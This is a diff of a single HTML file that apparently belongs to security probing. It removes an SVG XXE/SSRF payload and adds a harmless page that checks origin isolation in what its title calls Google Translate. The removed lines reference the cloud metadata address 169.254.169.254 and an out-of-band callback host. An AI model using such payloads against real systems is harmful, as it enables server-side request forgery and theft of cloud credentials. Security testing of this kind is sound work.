@@ -1,11 +1,28 @@
-<html>
-  XSS
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image href="http://ebjylzcbjtyrebsynorge7dsqito670fb.oast.fun/ssrf-test"/>
-  <text>&xxe;</text>
-</svg>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Translate Isolation Test</title>
+</head>
+<body>
+  <h2>Origin Isolation Test</h2>
+  <pre id="result"></pre>
+
+  <script>
+    const results = {
+      origin: location.origin,
+      hostname: location.hostname,
+      isTopWindow: window === window.top
+    };
+
+    try {
+      results.topOrigin = window.top.location.origin;
+    } catch (e) {
+      results.topOrigin = "Blocked by Same-Origin Policy";
+    }
+
+    document.getElementById("result").textContent =
+      JSON.stringify(results, null, 2);
+  </script>
+</body>
 </html>
